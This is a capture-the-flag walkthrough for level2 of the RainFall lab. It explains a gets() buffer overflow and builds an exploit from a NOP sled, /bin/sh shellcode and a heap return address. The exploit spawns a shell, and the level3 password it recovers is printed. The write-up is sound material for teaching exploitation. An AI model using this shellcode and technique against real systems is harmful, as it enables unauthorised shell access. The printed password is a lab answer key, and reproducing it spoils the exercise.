# Walkthrough

## Solution

```
level2@RainFall:~$ (python -c "print '\x90' * 35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08'" ; cat) | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```  
## Explanation

### Execution

```
level2@RainFall:~$ ./level2 
hello
hello
```
-> The program waits for an input, and then echo that output.  

### Disassembly

```
info function
0x080484d4  p
0x0804853f  main
```  

You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  

### Steps

We run level2 with gdb.  
The main calls the p function.  
p uses the gets function, we can therefore use a buffer overflow.  
However, there is no syscall to /bin/sh to allow us to access a shell.  
-> We have to use a shellcode to spawn a shell.  

#### Find the offset

We segfault at 80 we will therefore have something like:  
> print '\x90' * x + 'shellcode' + buffer_address (\x90 = NOP code)  
The shellcode we found has a length of 45, we will therefore print 35 A (80 - 45).  

For the address, we cannot use an address located on the stack, because of this check:
```
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
```  
If the address starts with 0xb, it  will exit the program.  
https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6  

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave                         // put a breakpoint here, to get return address of strdup
   0x0804854b <+12>:	ret    
End of assembler dump.
(gdb) break *0x0804854a
Breakpoint 1 at 0x804854a
(gdb) run
Starting program: /home/user/level2/level2 
hello
hello

Breakpoint 1, 0x0804854a in main ()
(gdb) i r $eax
eax            0x804a008	134520840
```  
--> return address of strdup is 0x804a008,  
-> We will use the return address of strdup, which is located on the heap to inject the shellcode.  

Shellcode from: https://beta.hackndo.com/buffer-overflow/  

### Final command

```
--> level2@RainFall:~$ (python -c "print '\x90' * 35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08'" ; cat) | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```


<!-- __builtin_return_address
https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html -->